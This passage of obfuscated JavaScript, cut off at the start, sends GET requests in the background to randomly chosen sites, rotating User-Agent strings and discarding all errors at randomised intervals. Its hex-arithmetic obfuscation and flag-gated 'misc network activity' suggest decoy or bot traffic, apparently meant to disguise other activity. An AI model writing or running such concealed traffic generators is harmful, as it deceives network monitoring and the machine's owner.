      setTimeout(f, (0x11bf4 + 0xe9b1 + -0x11b45) * l * getRandomInt(-0xfeb + 0x1889 + -0x89d, 0x482 * 0x5 + 0x2570 + 0x1 * -0x3bf7));
  }, -0x312224 + -0x49e9b6 + 0xb1fa5a * 0x1);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (-0x1 * -0x1ad + 0xd * 0x223 + -0x21c) * getRandomInt(-0x671 + -0x1ce4 + 0x2356, -0x1c9 * 0xd + -0x224e + 0x4 * 0xe62));
}, 0x197c + 0x19ef + -0x3307);